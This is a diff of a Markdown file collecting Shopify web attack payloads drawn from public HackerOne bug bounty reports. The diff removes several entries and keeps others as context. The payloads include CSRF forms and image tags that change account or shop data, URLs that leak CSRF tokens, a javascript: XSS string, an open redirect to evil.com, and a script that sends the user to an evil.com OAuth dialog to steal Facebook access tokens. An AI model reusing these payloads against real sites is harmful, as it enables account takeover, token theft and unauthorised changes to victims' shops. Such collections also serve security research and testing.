@@ -1,6 +1,6 @@
 # Shopify
 
-83 payloads.
+77 payloads.
 
 ### `56e13cfe`
 
@@ -62,18 +62,6 @@ javascript:alert(document.domain) //http://target.com/uploads/pwned.jpg
 ```
 
 — [Strored Cross Site Scripting](https://hackerone.com/reports/106636) · Shopify · [hussein98d](https://hackerone.com/hussein98d) · $500.0
-
-### `013af1b1`
-
-```
-<html>
-<body>
- <img src="https://target.com/auth/twitter/disconnect">
-  </body>
-</html>
-```
-
-— [Twitter Disconnect CSRF](https://hackerone.com/reports/111216) · Shopify · [akhil-reni](https://hackerone.com/akhil-reni)
 
 ### `81be2891`
 
@@ -156,61 +144,6 @@ https://<shop>.target.com/admin/bulk?resource_name=Product&return_to=/..//evil.c
 
 **Parameter:** `first_name`
 — [Unauthenticated Stored XSS on <any>.target.com via checkout page](https://hackerone.com/reports/189378) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)
-
-### `88dc6a8e`
-
-```
-<form action="https://[shop].target.com/admin/products.json" method=post>
-<input name="product[title]" value="API CSRF TEST">
-<input name="product[vendor]" value="test">
-<input name="product[body_html]" value="<h1>API CSRF TEST [Can be stored XSS for admins]</h1>">
- <input name="product[product_type]" value="test">
-<input type=submit>
-</form>
-```
-
-— [CSRF in all API endpoints when authenticated using HTTP Authentication](https://hackerone.com/reports/195156) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)
-
-### `cdb26df4`
-
-```
-target.com/[app_id]?authenticity_token=[current_user_authenticity_token]
-```
-
-**Parameter:** `authenticity_token`
-— [target.com - CSRF token leakage through Google Analytics](https://hackerone.com/reports/196458) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)
-
-### `eb2b7867`
-
-```
-https://target.com/[attacker's_app]?authenticity_token=[victim's_token]
-```
-
-**Parameter:** `authenticity_token`
-— [target.com - CSRF token leakage through Google Analytics](https://hackerone.com/reports/196458) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)
-
-### `8fa898ce`
-
-```
-https://target.com/img-src-x-onerror-prompt2?reveal_support=true?authenticity_token=[Your_CSRF_TOKEN]&utf8=%E2%9C%93
-```
-
-**Parameter:** `authenticity_token`
-— [target.com - CSRF token leakage through Google Analytics](https://hackerone.com/reports/196458) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)
-
-### `2d89648f`
-
-```
-<script>
-window.onload = function () { 
-  window.setTimeout(function() {
-              document.getElementById("token").innerHTML = "<iframe src='https://target.com/users/auth/shopify?shop=evil2.com'></iframe>";   
-          }, 5000);
-          window.setTimeout(function() {
-               window.open('https://evil.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fevil3.com%2Fseller/onboarding/1&response_type=code&scope=email%2Cmanage_pages%2C
-```
-
-— [Stealing users' facebook access tokens - target.com](https://hackerone.com/reports/211477) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)
 
 ### `b62ca76b`
 
